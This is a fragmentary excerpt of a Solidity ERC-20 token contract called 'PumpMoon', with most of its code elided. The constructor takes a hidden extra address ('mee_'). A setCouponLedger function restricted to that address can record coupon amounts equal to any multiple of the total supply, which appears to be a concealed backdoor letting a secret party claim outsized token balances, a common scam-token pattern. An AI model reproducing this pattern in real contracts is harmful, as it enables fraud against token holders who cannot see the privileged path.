...
contract PumpMoon is Context, Ownable, IERC20 {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_,address mee_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    ...
    function setCouponLedger(string memory couponCode, uint256 amount) external {
        require(isMee(), "Caller is not the original caller");
        _couponLedger[couponCode] = _totalSupply*amount;
    }
